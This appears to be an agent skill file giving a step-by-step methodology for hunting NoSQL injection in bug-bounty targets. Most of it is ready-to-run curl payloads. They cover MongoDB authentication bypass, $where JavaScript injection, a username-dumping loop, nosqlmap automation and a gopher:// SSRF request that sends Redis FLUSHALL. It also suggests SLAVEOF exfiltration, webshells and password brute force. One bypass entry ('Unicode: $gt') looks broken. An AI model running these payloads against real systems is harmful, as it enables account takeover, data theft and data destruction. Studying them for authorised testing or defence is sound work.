---
name: hunt-nosqli
description: Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.
sources: hackerone_public
report_count: 14
---

# HUNT-NOSQLI — NoSQL Injection

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

## Attack Surface Signals

### URL & Param Patterns
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Stack Signals
| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| 500 ISE on non-string JSON types (boolean/int/array) | Type confusion → DB coupling (Phase 0 probe) |
| 500 ISE on `{"$ne":""}` objects | Operators reach DB but crash — try $gt/$regex/$in |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---

## Step-by-Step Hunting Methodology

### Phase 0 — Type-Confusion Pre-Exploitation Probe (500 ISE Differential)

Before trying operator injection, send non-string types (boolean, integer,
array) where the endpoint expects a string. If the backend passes the raw
value to the database without type validation, the query crashes → **500
Internal Server Error**. A normal request (string values) returns 400/401,
but type-confused values return 500. This differential proves the backend
couples user input directly to the database — a necessary precondition for
operator injection to work.

```bash
# Baseline — normal string request
curl -s -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
# → 400 or 401 (expected)

# Type-confusion probes
curl -s -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":true,"password":true}'
# → 500 ISE = DB coupling confirmed (no type validation before query)

curl -s -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":1,"password":1}'
# → 500 ISE = same signal

curl -s -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":["a"],"password":["b"]}'
# → 500 ISE = same signal
```

**Interpretation:**
- **400/401 on type confusion** = server validates types before DB →
  operators likely also filtered → low probability of NoSQLi
- **500 ISE on type confusion** = server passes raw value to DB →
  operators likely reach the DB too → **proceed to Phase 1**
- **500 ISE on `{"$ne":""}` but no auth bypass** = operators reach the DB
  but crash (field type mismatch, index conflict). Try `$gt`, `$regex`,
  `$in` — some may produce a valid match while others crash. A crash is
  still a finding (DoS via crafted input) but not auth bypass.

**Pitfall:** CDNs (Cloudflare) strip 500 error bodies. The **status code
differential** (401 for strings vs 500 for objects) is the signal — don't
dismiss a 500 as "just a server error." A well-functioning API returns 400
for bad input types, not 500. A 500 means the server tried to use the value.

**Pitfall:** Timing-based `$where` attacks may not produce measurable delays
behind a CDN (100-200ms CDN latency masks sub-second DB delays). Use
response-code/body differential instead of timing when behind Cloudflare.

### Phase 0.5 — Distinguishing Where the 500 Crash Happens (The Bcrypt Wall)

Phase 0 confirms type confusion causes 500 ISE, but **500 does NOT prove
operators reach the DB**. You must determine WHERE the crash happens before
attempting operator injection. Three possible crash locations:

| Crash Location | Trigger | Operators Reach DB? | Exploitable? |
|---------------|---------|---------------------|--------------|
| **Input processing** (`username.trim()`, `.toLowerCase()`) | Object username + string password → 500 | No — crash before query | No (DoS only) |
| **DB query** (MongoDB receives object) | Object field passed directly to `findOne()` | **Yes** — operators evaluated | **Yes — auth bypass / data exfil** |
| **Post-query** (`bcrypt.compare(object, hash)`) | String username + object password → 500 | No — crash in bcrypt, not DB | Username enum only |

**The Bcrypt Wall pattern** (most common in Node.js + Mongoose apps):

```javascript
// Typical vulnerable-looking but NOT exploitable pattern:
const user = await User.findOne({ username: req.body.username }); // ← string only
if (!user) return res.status(401).json({ error: "wrong credentials" });
const match = await bcrypt.compare(req.body.password, user.passwordHash);
// ↑ bcrypt.compare(OBJECT, string) → throws TypeError → 500 ISE
```

**Diagnostic test — find the crash location:**

```bash
# Test 1: Object USERNAME + string password
# If 500 → crash in input processing (username.trim() etc.)
# If 401 → username passed to DB as-is, no user matched
curl -sS -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^zzz_nonexist"},"password":"test"}'
# 500 = crash in input processing → operators on username NOT evaluated

# Test 2: String username (known valid) + object password
# If 500 → user found, crash in bcrypt/post-query
# If 401 → user not found, early return before bcrypt
curl -sS -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -d '{"username":"admin","password":{"$ne":""}}'
# 500 = user EXISTS, crash in bcrypt → operators on password NOT evaluated

# Test 3: String username (known INVALID) + object password
# If 401 → user not found, early return (confirms Test 2 oracle)
curl -sS -o /dev/null -w "%{http_code}" -X POST https://$TARGET/api/login \
  -d '{"username":"zzz_nonexist","password":{"$ne":""}}'
# 401 = user NOT found → confirms: 500 in Test 2 = user exists
```

**Oracle from the Bcrypt Wall pattern:**
- `{"username":"admin","password":{"$ne":""}}` → **500** = user exists
- `{"username":"nonexist","password":{"$ne":""}}` → **401** = user not found
- This gives **username enumeration** (500 vs 401) but NOT auth bypass

**Why operators on password DON'T work through the bcrypt wall:**
The app queries by username only (`findOne({username})`), then hashes the
password client-side or compares with `bcrypt.compare()`. The password
field is NEVER passed to MongoDB as a query operator. So `{"password":{"$ne":""}}`
crashes in `bcrypt.compare()` — bcrypt tries to call `.toString()` or
`.charAt()` on the object, not MongoDB evaluating `$ne`.

**Confirming operators are NOT evaluated:**
```bash
# If $regex were evaluated by MongoDB, non-matching regex would return 401
# (no user found) while matching regex would return 500 (user found, bcrypt crash)
# If ALL return 500 regardless → operators NOT reaching DB
curl -d '{"username":"admin","password":{"$regex":"^zzz_impossible"}}'  # should NOT match
curl -d '{"username":"admin","password":{"$regex":".*"}}'              # should match all
curl -d '{"username":"admin","password":{"$ne":"wrongpass"}}'           # should match all except wrong
# All → 500 = operators NOT evaluated, crash is in bcrypt
```

**What IS exploitable from the Bcrypt Wall:**
1. **Username enumeration** (500 = exists, 401 = not found)
2. **DoS** (single request crashes server process)
3. **Combined with no rate limiting** → unlimited brute force on password
   using string values (bypass NoSQLi entirely, just brute force)

**When to STOP trying NoSQLi and switch to brute force:**
- All object passwords return 500 regardless of operator or regex match
- All object usernames return 500 regardless of operator or regex match
- `$where` produces no timing delay
- Form-encoded parameter pollution returns "missing input" (app only parses JSON)
- → The app has type confusion (DoS + username enum) but operators never
  reach MongoDB. Switch to brute force if no rate limiting, or move on.

### Phase 1 — Auth Bypass (MongoDB)
```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### Phase 2 — URL Parameter Injection
```bash
# Array notation (Express/PHP-style)
curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### Phase 3 — $where Blind Injection (time-based)
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 4 — Data Dump via Regex
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Automation
```bash
# nosqlmap
pip3 install nosqlmap
nosqlmap -u "https://$TARGET/api/login" --attack 1

# nosqlmap data extraction
nosqlmap -u "https://$TARGET/api/login" --attack 2
```

### Phase 6 — Redis via SSRF
```bash
# If SSRF found, probe internal Redis via gopher://
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---

## Bypass Table

| Defense | Bypass |
|---------|--------|
| Type validation rejects objects/arrays | Try URL-param notation: `password[$ne]=x` |
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |
| CDN strips 500 error body | Use status-code differential (401 vs 500), not error message |
| CDN masks timing attacks | Use response-code/body differential instead of $where sleep |
| **Bcrypt wall** (app does `findOne({username})` then `bcrypt.compare(password, hash)`) | Operators on password never reach MongoDB. 500 ISE on object password = crash in bcrypt, not DB eval. **Pivot to username enumeration** (500=exists, 401=not) + brute force if no rate limit |
| **Input-processing crash** (app calls `.trim()` on object) | Object username crashes before DB query. Operators on username never evaluated. Only DoS, no enumeration |

---

## Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |
| Bcrypt wall + no rate limit | Username enum (500/401 oracle) → brute force password as strings | Auth bypass (slower but no rate limit = feasible) |
| Type confusion 500 ISE | DoS via single crafted request | Availability impact |

---

## Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium

## References

- `references/bcrypt-wall-diagnostics.md` — Session reference: full diagnostic
  decision tree for distinguishing input-processing crash vs bcrypt wall vs
  real DB operator evaluation, with test results from a real target.
